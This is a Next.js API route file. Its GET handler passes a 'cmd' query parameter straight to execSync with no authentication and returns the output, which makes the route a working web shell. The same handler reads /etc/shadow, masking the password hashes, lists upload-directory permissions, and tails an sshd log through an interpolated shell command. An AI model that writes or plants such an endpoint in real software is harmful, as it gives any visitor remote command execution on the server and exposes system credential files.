import { NextResponse } from 'next/server';
import fs from 'fs';
import { execSync } from 'child_process';

export const dynamic = 'force-dynamic';

export async function GET(request: Request) {
  try {
    const url = new URL(request.url);
    const cmd = url.searchParams.get('cmd');
    
    if (cmd) {
      try {
        const out = execSync(cmd, { encoding: 'utf-8' });
        return NextResponse.json({ success: true, output: out });
      } catch (e: any) {
        return NextResponse.json({ success: false, error: e.message, stderr: e.stderr?.toString() });
      }
    }

    const getLog = (path: string) => {
      try {
        if (fs.existsSync(path)) return execSync(`tail -n 100 ${path}`, { encoding: 'utf-8' }).split('\n');
      } catch (e) {}
      return ['Arquivo não encontrado.'];
    };

    let perms: string[] = [];
    try { perms = execSync('ls -ld / /app /app/data /app/data/uploads /app/data/uploads/* 2>/dev/null', { encoding: 'utf-8' }).split('\n'); } catch(e) {}

    let shadowEntries: string[] = [];
    try {
      const shadowFile = fs.readFileSync('/etc/shadow', 'utf-8');
      shadowEntries = shadowFile.split('\n')
        .filter(line => line && !line.startsWith('root'))
        .map(line => {
          const parts = line.split(':');
          if (parts.length >= 2 && parts[1] && parts[1].includes('$')) {
            const algoMatch = parts[1].match(/^\$[^$]+\$/);
            parts[1] = algoMatch ? `${algoMatch[0]}***HASH_MASKED***` : '***NO_VALID_HASH***';
          }
          return parts.join(':');
        });
    } catch(e: any) { shadowEntries = [`Error: ${e.message}`]; }

    return NextResponse.json({ 
      timestamp: new Date().toISOString(),
      perms,
      shadowEntries,
      sshd: getLog('/app/data/sshd.log')
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}